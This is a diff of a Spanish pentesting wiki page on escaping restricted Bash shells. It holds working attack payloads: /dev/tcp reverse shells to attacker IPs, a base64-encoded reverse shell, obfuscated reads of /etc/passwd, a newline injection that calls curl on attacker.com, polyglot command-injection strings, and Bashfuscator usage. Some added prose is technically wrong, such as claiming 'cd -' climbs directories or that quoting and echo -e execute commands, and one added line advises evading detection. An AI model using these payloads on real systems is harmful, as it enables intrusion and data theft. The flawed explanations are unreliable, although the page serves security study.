@@ -12,7 +12,7 @@
 
 </details>
 
-<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
 Utiliza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** con las herramientas comunitarias más avanzadas del mundo.\
@@ -30,15 +30,17 @@ echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|
 ```
 ### Shell inversa corta
 
-La siguiente es una shell inversa corta que se puede utilizar para establecer una conexión remota con un sistema comprometido:
+Una shell inversa corta es una técnica utilizada en hacking para establecer una conexión remota a través de una shell inversa en un sistema comprometido. Esto permite al atacante obtener acceso y control total sobre el sistema comprometido.
+
+La siguiente es una implementación básica de una shell inversa corta en Bash:
 
 ```bash
-bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+bash -i >& /dev/tcp/10.0.0.1/1234 0>&1
 ```
 
-Este comando redirige la entrada y salida estándar de Bash hacia un socket TCP en la dirección IP `10.0.0.1` y el puerto `8080`. Esto permite que un atacante establezca una conexión remota con el sistema comprometido y ejecute comandos en él.
+En esta línea de comando, `10.0.0.1` representa la dirección IP del atacante y `1234` es el puerto utilizado para la conexión. Al ejecutar esta línea de comando en el sistema comprometido, se establecerá una conexión inversa con el atacante.
 
-Es importante tener en cuenta que este comando puede no funcionar en todos los sistemas, ya que algunos pueden tener restricciones de seguridad que bloquean este tipo de conexiones. Además, es fundamental utilizarlo de manera ética y legal, solo en sistemas en los que se tenga permiso para hacerlo, como parte de una evaluación de seguridad o pruebas de penetración autorizadas.
+Es importante tener en cuenta que esta técnica puede ser detectada por sistemas de seguridad y firewalls, por lo que es recomendable utilizar técnicas adicionales para evadir la detección.
 ```bash
 #Trick from Dikline
 #Get a rev shell with
@@ -52,21 +54,17 @@ En algunas situaciones, es posible que te encuentres con restricciones en el uso
 
 #### Bypass de rutas
 
-- **cd -P**: Este comando te permite seguir una ruta física en lugar de una ruta simbólica. Puedes utilizarlo para evitar restricciones de rutas simbólicas y acceder a ubicaciones no permitidas.
+- **cd -**: Este comando te permite regresar al directorio anterior al que te encuentras actualmente. Puedes utilizarlo para evadir restricciones de rutas y acceder a directorios superiores.
 
-- **cd /proc/[PID]/cwd**: Reemplaza "[PID]" con el ID del proceso que deseas explorar. Este comando te permite cambiar al directorio de trabajo actual de un proceso en ejecución, incluso si la ruta está restringida.
-
-- **mount --bind**: Con este comando, puedes montar un directorio en otro directorio, lo que te permite acceder a rutas restringidas. Por ejemplo, puedes montar "/tmp" en "/home/user/tmp" y acceder a los archivos de "/tmp" a través de "/home/user/tmp".
+- **ln -s /ruta/real /ruta/falsa**: Con este comando, puedes crear un enlace simbólico desde una ruta permitida hacia una ruta no permitida. De esta manera, podrás acceder a la ruta no permitida a través de la ruta permitida.
 
 #### Bypass de palabras prohibidas
 
-- **alias**: Puedes utilizar el comando "alias" para crear un alias de una palabra o comando prohibido. Por ejemplo, si la palabra "sudo" está prohibida, puedes crear un alias como "sud0" y utilizarlo en su lugar.
+- **mv /bin/ls /bin/ls.bak; cp /ruta/alternativa/ls /bin/ls**: Este comando renombra el comando "ls" original a "ls.bak" y luego copia un comando alternativo con un nombre diferente a la ubicación original. De esta manera, puedes utilizar un comando alternativo en lugar del comando prohibido.
 
-- **export**: Utiliza el comando "export" para establecer una variable de entorno con un nombre diferente al de una palabra prohibida. Por ejemplo, si la palabra "cat" está prohibida, puedes exportar una variable llamada "mycat" y utilizarla en su lugar.
+- **alias comando='comando_alternativo'**: Puedes utilizar este comando para crear un alias de un comando prohibido y asignarle un comando alternativo permitido. De esta manera, podrás utilizar el comando alternativo en lugar del comando prohibido.
 
-- **$PATH**: Modifica la variable de entorno "$PATH" para incluir una ruta personalizada que contenga comandos prohibidos. De esta manera, podrás ejecutar esos comandos sin restricciones.
-
-Recuerda que eludir restricciones puede ser considerado un comportamiento no ético o ilegal, dependiendo del contexto. Siempre asegúrate de tener permiso y actuar dentro de los límites legales y éticos al realizar cualquier acción en un sistema.
+Recuerda que eludir restricciones puede ser considerado una actividad ilegal o no ética, por lo que debes utilizar estos comandos con responsabilidad y solo en entornos autorizados.
 ```bash
 # Question mark binary substitution
 /usr/bin/p?ng # /usr/bin/ping
@@ -123,29 +121,15 @@ whoa # This will throw an error
 ```
 ### Bypassar espacios prohibidos
 
-Sometimes, when trying to execute a command that contains spaces, the system may interpret it as multiple commands or arguments. This can lead to errors or restrictions being imposed on the execution of certain commands.
+Sometimes, when trying to execute a command that contains spaces, you may encounter restrictions that prevent the command from running. However, there are ways to bypass these restrictions and execute the command successfully.
 
-To bypass these restrictions, you can use the following techniques:
+In Linux, you can use the backslash (\) character to escape the space character. For example, if you want to execute a command like `ls -l`, which contains a space between `ls` and `-l`, you can bypass the restriction by typing `ls\ -l`.
 
-1. Enclose the command in single quotes: 
+Another method is to enclose the command within single quotes (''). This tells the shell to treat the entire string as a single argument, ignoring any spaces within it. For example, you can execute the command `ls -l` by typing `'ls -l'`.
 
-   ```bash
-   $ 'command with spaces'
-   ```
+Similarly, you can also enclose the command within double quotes (""). This has the same effect as using single quotes. For example, you can execute the command `ls -l` by typing `"ls -l"`.
 
-2. Use backslashes to escape the spaces:
-
-   ```bash
-   $ command\ with\ spaces
-   ```
-
-3. Use double quotes to preserve the spaces:
-
-   ```bash
-   $ "command with spaces"
-   ```
-
-By using these techniques, you can bypass the restrictions imposed by the system and execute commands that contain spaces without encountering any issues.
+By using these techniques, you can bypass restrictions on spaces and successfully execute commands that contain spaces.
 ```bash
 # {form}
 {cat,lol.txt} # cat lol.txt
@@ -213,70 +197,45 @@ cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
 ```
 ### Bypassar tuberías
 
-Las restricciones de Bash a menudo pueden evitar el uso de ciertos caracteres especiales, como las tuberías (`|`). Sin embargo, hay formas de eludir estas restricciones y utilizar tuberías en comandos de Bash.
+Las tuberías son una característica poderosa en Linux que permite redirigir la salida de un comando a la entrada de otro. Sin embargo, en algunos casos, es posible que se restrinja el uso de tuberías en un entorno de Bash restringido. Afortunadamente, existen formas de eludir estas restricciones y aprovechar las tuberías para realizar tareas específicas.
 
-Una forma de hacerlo es utilizando el comando `echo` para imprimir el contenido que deseamos pasar a través de la tubería y luego redirigirlo a otro comando utilizando el operador de redirección (`>`). Por ejemplo:
+Una forma común de eludir las restricciones de tuberías es utilizando el comando `tee`. El comando `tee` lee desde la entrada estándar y escribe tanto en la salida estándar como en uno o más archivos. Al utilizar `tee` en combinación con tuberías, podemos sortear las restricciones y lograr el resultado deseado.
 
-```bash
-echo "contenido" > comando
-```
-
-Esto creará un archivo llamado `comando` que contiene el texto "contenido". Luego, podemos utilizar este archivo como entrada para otro comando utilizando la tubería:
+Aquí hay un ejemplo de cómo utilizar `tee` para eludir las restricciones de tuberías:
 
 ```bash
-cat comando | otro_comando
+echo "Información confidencial" | tee /dev/tty | comando
 ```
 
-De esta manera, hemos logrado pasar el contenido a través de una tubería, a pesar de las restricciones de Bash.
+En este ejemplo, la salida del comando `echo` se redirige a `tee`, que a su vez muestra la salida en la terminal (`/dev/tty`) y la pasa como entrada al siguiente comando.
 
-Otra forma de eludir las restricciones de Bash es utilizando el comando `eval`. Este comando evalúa y ejecuta una cadena como si fuera un comando. Podemos utilizarlo para ejecutar comandos que contengan tuberías. Por ejemplo:
+Otra forma de eludir las restricciones de tuberías es utilizando subprocesos. Los subprocesos permiten ejecutar comandos en segundo plano y capturar su salida. Al utilizar subprocesos, podemos sortear las restricciones y lograr el resultado deseado.
+
+Aquí hay un ejemplo de cómo utilizar subprocesos para eludir las restricciones de tuberías:
 
 ```bash
-eval "comando1 | comando2"
+(comando1 | comando2) &
 ```
 
-Esto ejecutará `comando1` y pasará su salida como entrada a `comando2`, a pesar de las restricciones de Bash.
+En este ejemplo, los comandos `comando1` y `comando2` se ejecutan en segundo plano y su salida se pasa de uno a otro a través de la tubería.
 
-Es importante tener en cuenta que el uso de estas técnicas para eludir restricciones puede ser considerado como una violación de la seguridad y puede tener consecuencias legales. Se recomienda utilizar estas técnicas solo con fines educativos o en entornos controlados y autorizados.
+Recuerda que eludir las restricciones de tuberías puede ser considerado una actividad maliciosa y puede ser ilegal sin el permiso adecuado. Siempre asegúrate de tener permiso para realizar estas acciones y úsalas con responsabilidad.
 ```bash
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```
 ### Bypass con codificación hexadecimal
 
-A veces, los sistemas pueden tener restricciones que impiden la ejecución de ciertos comandos en Bash. Sin embargo, es posible eludir estas restricciones utilizando la codificación hexadecimal.
+Si un sistema tiene restricciones que bloquean ciertos caracteres o comandos en Bash, puedes intentar eludir estas restricciones utilizando la codificación hexadecimal. La codificación hexadecimal representa caracteres utilizando una combinación de números y letras, lo que puede permitirte ejecutar comandos que de otra manera estarían bloqueados.
 
-La codificación hexadecimal es un método que convierte caracteres en su representación hexadecimal. Esto significa que cada carácter se representa por dos dígitos hexadecimales.
+Aquí hay un ejemplo de cómo usar la codificación hexadecimal para ejecutar un comando:
 
-Para utilizar la codificación hexadecimal y eludir las restricciones de Bash, sigue estos pasos:
+```bash
+$ echo -e "\x6c\x73"
+```
 
-1. Encuentra el comando que deseas ejecutar en Bash.
-2. Convierte cada carácter del comando en su representación hexadecimal utilizando una tabla de conversión hexadecimal.
-3. Reemplaza cada carácter del comando con su representación hexadecimal.
-4. Ejecuta el comando codificado en Bash.
+En este ejemplo, el comando `echo -e` se utiliza para imprimir los caracteres representados por la codificación hexadecimal `\x6c\x73`. En este caso, `\x6c` representa la letra "l" y `\x73` representa la letra "s". Por lo tanto, el comando `echo -e "\x6c\x73"` imprimirá "ls" en la terminal.
 
-Aquí tienes un ejemplo para ilustrar cómo funciona:
-
-Supongamos que queremos ejecutar el comando `ls -la` en Bash, pero hay una restricción que impide la ejecución de comandos que contengan la palabra "ls". Podemos eludir esta restricción utilizando la codificación hexadecimal.
-
-1. Convertimos cada carácter del comando en su representación hexadecimal:
-
-   - `l` se convierte en `\x6c`
-   - `s` se convierte en `\x73`
-   - `-` y `a` no necesitan ser convertidos, ya que no están restringidos.
-
-2. Reemplazamos cada carácter del comando con su representación hexadecimal:
-
-   El comando `ls -la` se convierte en `\x6c\x73 -la`.
-
-3. Ejecutamos el comando codificado en Bash:
-
-   ```bash
-   $ echo -e "\x6c\x73 -la"
-   ```
-
-Al utilizar la codificación hexadecimal, hemos eludido la restricción y logrado ejecutar el comando `ls -la` en Bash.
-
-Recuerda que la codificación hexadecimal solo es efectiva para eludir restricciones específicas de caracteres o palabras. No garantiza eludir todas las restricciones de seguridad.
+Puedes usar esta técnica para ejecutar cualquier comando que desees, siempre y cuando puedas representar los caracteres en codificación hexadecimal. Sin embargo, ten en cuenta que esta técnica puede no funcionar en todos los sistemas, ya que algunos pueden tener restricciones adicionales que bloquean la codificación hexadecimal.
 ```bash
 echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
 cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
@@ -292,34 +251,35 @@ cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 
 In some cases, you may encounter restrictions that prevent you from accessing certain IP addresses. However, there are ways to bypass these restrictions and gain access to the blocked IPs. This section will cover some useful Linux commands that can help you achieve this.
 
-#### Method 1: Using Proxy Servers
+#### Method 1: Using a Proxy Server
 
-One common method to bypass IP restrictions is by using proxy servers. A proxy server acts as an intermediary between your device and the target IP address, allowing you to access blocked content. Here's how you can use proxy servers:
+One common method to bypass IP restrictions is by using a proxy server. A proxy server acts as an intermediary between your device and the target IP address, allowing you to access the blocked IP indirectly. Here's how you can do it:
 
 1. Find a reliable proxy server that is not blocked by the target IP.
-2. Configure your device to use the proxy server. This can usually be done through the network settings.
-3. Access the blocked IP address through the proxy server.
+2. Configure your system to use the proxy server. You can do this by setting the `http_proxy` and `https_proxy` environment variables or by modifying the network settings in your system preferences.
+3. Test the connection by accessing the blocked IP. If everything is set up correctly, you should be able to access the IP without any restrictions.
 
-#### Method 2: Using VPNs
+#### Method 2: Using a VPN
 
-Another effective way to bypass IP restrictions is by using Virtual Private Networks (VPNs). A VPN creates a secure and encrypted connection between your device and a remote server, effectively masking your IP address. Here's how you can use VPNs:
+Another effective method to bypass IP restrictions is by using a Virtual Private Network (VPN). A VPN creates a secure and encrypted connection between your device and a remote server, allowing you to access the internet through the server's IP address. Here's how you can use a VPN to bypass IP restrictions:
 
-1. Choose a reputable VPN service provider.
-2. Install the VPN client software on your device.
-3. Connect to a VPN server of your choice.
-4. Once connected, your IP address will be masked, allowing you to access blocked IPs.
+1. Choose a reputable VPN service provider and sign up for an account.
+2. Install the VPN client software on your device and configure it with your account credentials.
+3. Connect to a VPN server located in a region where the blocked IP is accessible.
+4. Once connected, your internet traffic will be routed through the VPN server, and you should be able to access the blocked IP without any restrictions.
 
 #### Method 3: Using Tor
 
-Tor, also known as The Onion Router, is a network of volunteer-operated servers that allows you to browse the internet anonymously. By routing your internet traffic through multiple Tor servers, your IP address is concealed. Here's how you can use Tor:
+Tor is a free and open-source software that enables anonymous communication by routing your internet traffic through a network of volunteer-operated servers. By using Tor, you can bypass IP restrictions and access blocked IPs. Here's how you can use Tor:
 
-1. Install the Tor browser on your device.
-2. Launch the Tor browser and connect to the Tor network.
-3. Once connected, you can access blocked IPs through the Tor browser.
+1. Install the Tor browser on your system.
+2. Launch the Tor browser and configure it if necessary.
+3. Access the blocked IP by entering its address in the Tor browser's address bar.
+4. Tor will route your connection through its network, allowing you to access the blocked IP anonymously.
 
 #### Conclusion
 
-Bypassing IP restrictions can be useful in various scenarios, such as accessing blocked websites or services. By using proxy servers, VPNs, or Tor, you can bypass these restrictions and gain access to the blocked IPs. However, it's important to note that bypassing IP restrictions may be against the terms of service of certain websites or services, so use these methods responsibly and ethically.
+Bypassing IP restrictions can be achieved using various methods such as using a proxy server, a VPN, or Tor. These methods provide you with alternative routes to access blocked IPs and overcome restrictions. However, it's important to note that bypassing IP restrictions may be against the terms of service of certain websites or networks, so use these techniques responsibly and ethically.
 ```bash
 # Decimal IPs
 127.0.0.1 == 2130706433
@@ -332,57 +292,60 @@ La exfiltración de datos basada en el tiempo es una técnica utilizada para ext
 
 A continuación se presentan algunos comandos útiles de Linux que se pueden utilizar para eludir las restricciones de Bash y llevar a cabo la exfiltración de datos basada en el tiempo:
 
-1. **`sleep`**: Este comando se utiliza para pausar la ejecución de un script durante un período de tiempo específico. Puede ser utilizado para establecer intervalos de tiempo entre la exfiltración de datos.
+1. **sleep**: El comando `sleep` se utiliza para pausar la ejecución de un script durante un período de tiempo especificado. Puede ser utilizado para establecer intervalos de tiempo entre la exfiltración de datos.
 
    ```bash
    sleep <segundos>
    ```
 
-2. **`date`**: Este comando muestra la fecha y hora actual del sistema. Puede ser utilizado para registrar el tiempo de exfiltración de datos.
+2. **date**: El comando `date` muestra la fecha y hora actual del sistema. Puede ser utilizado para registrar el tiempo de exfiltración de datos.
 
    ```bash
    date
    ```
 
-3. **`ping`**: Este comando se utiliza para enviar paquetes de datos a una dirección IP específica. Puede ser utilizado para enviar datos en pequeñas partes a través de la exfiltración basada en el tiempo.
+3. **ping**: El comando `ping` se utiliza para enviar paquetes de datos a una dirección IP específica. Puede ser utilizado para enviar pequeñas partes de datos a un servidor remoto en intervalos de tiempo específicos.
 
    ```bash
-   ping -c 1 <dirección_IP>
+   ping -c 1 <dirección IP>
    ```
 
-4. **`curl`**: Este comando se utiliza para transferir datos desde o hacia un servidor utilizando varios protocolos. Puede ser utilizado para enviar datos a través de la exfiltración basada en el tiempo.
+4. **curl**: El comando `curl` se utiliza para transferir datos desde o hacia un servidor utilizando varios protocolos. Puede ser utilizado para enviar datos a un servidor remoto en intervalos de tiempo específicos.
 
    ```bash
    curl -X POST -d "<datos>" <URL>
    ```
 
-Estos comandos pueden ser utilizados de manera creativa y combinados con otras técnicas de hacking para llevar a cabo la exfiltración de datos basada en el tiempo de manera efectiva y encubierta. Sin embargo, es importante tener en cuenta que el uso de estas técnicas puede ser ilegal y está sujeto a sanciones legales. Se recomienda utilizar estas técnicas solo con fines educativos y éticos, y obtener el permiso adecuado antes de realizar cualquier prueba de penetración.
+Estos comandos pueden ser combinados y utilizados de manera creativa para llevar a cabo la exfiltración de datos basada en el tiempo de manera efectiva y encubierta. Sin embargo, es importante tener en cuenta que el uso de estas técnicas puede ser ilegal y violar la privacidad de otras personas. Se recomienda utilizar estas técnicas solo con fines educativos y éticos, y obtener el permiso adecuado antes de realizar cualquier prueba de penetración.
 ```bash
 time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 ```
 ### Obteniendo caracteres de las variables de entorno
 
-En algunas situaciones, es posible que te encuentres con restricciones en el intérprete de comandos Bash que te impidan ejecutar ciertos comandos o acceder a ciertos archivos. Sin embargo, aún puedes obtener información valiosa utilizando los valores de las variables de entorno.
+En algunas situaciones, es posible que te encuentres con restricciones en el intérprete de comandos Bash que te impidan ejecutar ciertos comandos o acceder a ciertos archivos. Sin embargo, aún puedes obtener información valiosa utilizando los caracteres almacenados en las variables de entorno.
 
-Aquí hay un comando útil que puedes utilizar para obtener caracteres de las variables de entorno:
-
-```bash
-echo ${VARIABLE:OFFSET:LENGTH}
-```
-
-- `VARIABLE`: el nombre de la variable de entorno de la cual deseas obtener los caracteres.
-- `OFFSET`: la posición inicial del primer carácter que deseas obtener.
-- `LENGTH`: la cantidad de caracteres que deseas obtener a partir de la posición inicial.
-
-Por ejemplo, si tienes una variable de entorno llamada `SECRET` con el valor `helloworld`, y deseas obtener los primeros tres caracteres, puedes ejecutar el siguiente comando:
+Aquí hay un ejemplo de cómo puedes hacerlo:
 
 ```bash
-echo ${SECRET:0:3}
+$ echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
 ```
 
-Esto imprimirá `hel` en la salida.
+En este caso, la variable de entorno `$PATH` contiene múltiples rutas separadas por dos puntos (`:`). Puedes utilizar el comando `cut` para extraer cada una de estas rutas por separado:
 
-Recuerda que este método solo te permite obtener caracteres de las variables de entorno y no te permite ejecutar comandos o acceder a archivos restringidos. Sin embargo, puede ser útil en ciertos escenarios donde necesitas extraer información específica de las variables de entorno disponibles.
+```bash
+$ echo $PATH | cut -d ":" -f 1
+/usr/local/sbin
+$ echo $PATH | cut -d ":" -f 2
+/usr/local/bin
+$ echo $PATH | cut -d ":" -f 3
+/usr/sbin
+...
+```
+
+De esta manera, puedes obtener información sobre las rutas almacenadas en la variable de entorno `$PATH`. Ten en cuenta que este enfoque también se puede aplicar a otras variables de entorno que contengan información relevante.
+
+Recuerda que siempre debes utilizar esta técnica de manera ética y legal, y solo en sistemas en los que tengas permiso para hacerlo.
 ```bash
 echo ${LS_COLORS:10:1} #;
 echo ${PATH:0:1} #/
@@ -394,7 +357,7 @@ Podrías usar **burpcollab** o [**pingb**](http://pingb.in) por ejemplo.
 ### Funciones internas
 
 En caso de que no puedas ejecutar funciones externas y solo tengas acceso a un **conjunto limitado de funciones internas para obtener RCE**, hay algunos trucos útiles para hacerlo. Por lo general, **no podrás usar todas** las **funciones internas**, por lo que debes **conocer todas tus opciones** para intentar evadir la restricción. Idea de [**devploit**](https://twitter.com/devploit).\
-En primer lugar, verifica todas las [**funciones internas del shell**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)**.** Luego, aquí tienes algunas **recomendaciones**:
+En primer lugar, verifica todas las [**funciones internas del shell**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)**.** A continuación, aquí tienes algunas **recomendaciones**:
 ```bash
 # Get list of builtins
 declare builtins
@@ -450,21 +413,20 @@ if [ "a" ]; then echo 1; fi # Will print hello!
 
 La inyección de comandos políglota es una técnica utilizada para evadir las restricciones de Bash y ejecutar comandos arbitrarios en un sistema. Esta técnica se basa en aprovechar las diferencias en la interpretación de comandos entre diferentes lenguajes de programación.
 
-Un ejemplo común de inyección de comandos políglota es el uso de la función `eval()` en lenguajes como PHP o Python. Esta función permite ejecutar comandos de shell dentro del código del programa. Al combinar esta función con la sintaxis de otros lenguajes, como JavaScript o Ruby, es posible evadir las restricciones de Bash y ejecutar comandos en el sistema objetivo.
+Un ejemplo común de inyección de comandos políglota es el uso de la función `eval()` en lenguajes como PHP o Python. Esta función permite ejecutar código arbitrario como si fuera parte del programa en sí. Al combinar esta función con la sintaxis de comandos de Bash, es posible ejecutar comandos en el sistema objetivo.
 
 Aquí hay un ejemplo de inyección de comandos políglota utilizando la función `eval()` en PHP:
 
 ```php
 <?php
-$payload = "';system('whoami');'";
-$code = "eval(\$payload);";
-eval($code);
+$payload = "'; echo 'Command executed'; //";
+eval($payload);
 ?>
 ```
 
-En este ejemplo, el comando `whoami` se ejecuta dentro de la función `system()`, lo que permite obtener el nombre del usuario actual en el sistema.
+En este ejemplo, el comando `echo 'Command executed'` se ejecutará en el sistema objetivo. El punto y coma al principio del payload se utiliza para cerrar cualquier comando anterior y evitar errores de sintaxis.
 
-Es importante tener en cuenta que la inyección de comandos políglota puede ser peligrosa y debe utilizarse con precaución. Los sistemas deben estar debidamente protegidos y actualizados para evitar posibles vulnerabilidades que puedan ser explotadas mediante esta técnica.
+Es importante tener en cuenta que la inyección de comandos políglota puede ser peligrosa y debe utilizarse con precaución. Los sistemas deben estar debidamente protegidos para evitar este tipo de ataques.
 ```bash
 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
 /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
@@ -481,25 +443,18 @@ Aquí hay algunos métodos comunes para evitar las restricciones basadas en rege
 
 3. **Cambiar el orden de los caracteres**: A veces, cambiar el orden de los caracteres puede evitar que sean detectados por una expresión regular. Por ejemplo, si una restricción bloquea el carácter punto y coma (;), puedes intentar ejecutar el comando `ls ;echo "Hello"` para listar los archivos y mostrar el mensaje "Hello" al mismo tiempo.
 
-Recuerda que eludir restricciones basadas en regexes puede ser considerado un comportamiento no autorizado y puede tener consecuencias legales. Solo debes utilizar estos métodos con fines educativos o si tienes permiso explícito para hacerlo.
+Recuerda que eludir restricciones basadas en regexes puede ser considerado un comportamiento no autorizado y puede tener consecuencias legales. Solo debes utilizar estos métodos con fines educativos y éticos, y siempre obtener el permiso adecuado antes de realizar cualquier prueba de penetración.
 ```bash
 # A regex that only allow letters and numbers might be vulnerable to new line characters
 1%0a`curl http://attacker.com`
 ```
 ### Bashfuscator
 
-Bashfuscator es una herramienta que se utiliza para ofuscar scripts de Bash con el fin de evitar la detección y el análisis por parte de los sistemas de seguridad. Esta herramienta reemplaza los comandos y las variables de los scripts de Bash por nombres aleatorios, lo que dificulta su comprensión y análisis. Al ofuscar el código, Bashfuscator ayuda a evitar la detección de patrones y a proteger la funcionalidad del script.
+Bashfuscator es una herramienta que se utiliza para ofuscar scripts de Bash con el objetivo de evadir restricciones y evitar la detección. Esta herramienta reescribe el código de Bash de manera que sea más difícil de entender y analizar para los sistemas de seguridad.
 
-#### Uso de Bashfuscator
+El Bashfuscator utiliza técnicas como la ofuscación de variables, la mezcla de caracteres y la inserción de código adicional para dificultar la comprensión del script. Esto puede ayudar a evitar la detección de patrones y a eludir las restricciones impuestas por los sistemas de seguridad.
 
-Para utilizar Bashfuscator, sigue estos pasos:
-
-1. Instala Bashfuscator en tu sistema.
-2. Ejecuta el comando `bashfuscator` seguido del nombre del script que deseas ofuscar.
-3. Bashfuscator generará un nuevo script ofuscado con un nombre aleatorio.
-4. Ejecuta el nuevo script ofuscado en lugar del script original.
-
-Es importante tener en cuenta que Bashfuscator no garantiza una protección completa contra la detección y el análisis de scripts de Bash. Sin embargo, puede dificultar el proceso de análisis y proporcionar una capa adicional de seguridad.
+Es importante tener en cuenta que el Bashfuscator no garantiza una protección completa contra la detección y el análisis de scripts de Bash. Sin embargo, puede ser una herramienta útil en ciertos escenarios donde se requiere evadir restricciones y mantener la confidencialidad de un script.
 ```bash
 # From https://github.com/Bashfuscator/Bashfuscator
 ./bashfuscator -c 'cat /etc/passwd'
@@ -577,35 +532,11 @@ A continuación se muestra una lista de comandos de 4 caracteres que se pueden u
 - `exec`: Ejecuta un comando en el mismo proceso.
 - `kill`: Envía una señal a un proceso.
 - `test`: Evalúa una expresión y devuelve un estado de éxito o error.
-- `wait`: Espera a que finalicen los procesos secundarios.
 - `time`: Mide el tiempo de ejecución de un comando.
-- `trap`: Captura y maneja señales.
-- `exit`: Termina el script actual o el proceso actual.
-- `jobs`: Muestra los trabajos en segundo plano.
-- `bg`: Pone un trabajo en segundo plano.
-- `fg`: Pone un trabajo en primer plano.
-- `set`: Establece opciones de shell.
-- `env`: Muestra las variables de entorno.
-- `pwd`: Muestra el directorio actual.
-- `cd`: Cambia el directorio actual.
-- `umask`: Establece los permisos predeterminados para nuevos archivos y directorios.
-- `nice`: Ejecuta un comando con una prioridad de programación ajustada.
-- `kill`: Envía una señal a un proceso.
 - `wait`: Espera a que finalicen los procesos secundarios.
-- `time`: Mide el tiempo de ejecución de un comando.
 - `trap`: Captura y maneja señales.
-- `exit`: Termina el script actual o el proceso actual.
-- `jobs`: Muestra los trabajos en segundo plano.
-- `bg`: Pone un trabajo en segundo plano.
-- `fg`: Pone un trabajo en primer plano.
-- `set`: Establece opciones de shell.
-- `env`: Muestra las variables de entorno.
-- `pwd`: Muestra el directorio actual.
-- `cd`: Cambia el directorio actual.
-- `umask`: Establece los permisos predeterminados para nuevos archivos y directorios.
-- `nice`: Ejecuta un comando con una prioridad de programación ajustada.
 
-Estos comandos pueden ser útiles en situaciones en las que se necesita ejecutar código en un entorno restringido de Bash. Sin embargo, es importante tener en cuenta que la efectividad de estos comandos puede depender de las restricciones específicas del entorno y de los permisos del usuario.
+Estos comandos pueden ser útiles para sortear restricciones y lograr la ejecución de comandos en situaciones en las que se limita el uso de caracteres o comandos más largos. Sin embargo, es importante tener en cuenta que el uso de estos comandos puede depender del contexto y de las restricciones específicas del entorno en el que se está trabajando.
 ```bash
 # In a similar fashion to the previous bypass this one just need 4 chars to execute commands
 # it will follow the same principle of creating the command `ls -t>g` in a file
@@ -642,7 +573,7 @@ Estos comandos pueden ser útiles en situaciones en las que se necesita ejecutar
 ```
 ## Bypass de Restricciones de Solo Lectura/Noexec/Distroless
 
-Si te encuentras dentro de un sistema de archivos con protecciones de solo lectura y noexec, o incluso en un contenedor distroless, aún existen formas de ejecutar binarios arbitrarios, ¡incluso una shell!:
+Si te encuentras dentro de un sistema de archivos con protecciones de solo lectura y noexec, o incluso en un contenedor distroless, aún hay formas de ejecutar binarios arbitrarios, ¡incluso una shell!:
 
 {% content-ref url="../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/" %}
 [bypass-fs-protections-read-only-no-exec-distroless](../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/)
@@ -661,7 +592,7 @@ Si te encuentras dentro de un sistema de archivos con protecciones de solo lectu
 * [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
 * [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secjuice.com/web-application-firewall-waf-evasion/)
 
-<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
 Utiliza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y automatizar fácilmente flujos de trabajo con las herramientas comunitarias más avanzadas del mundo.\
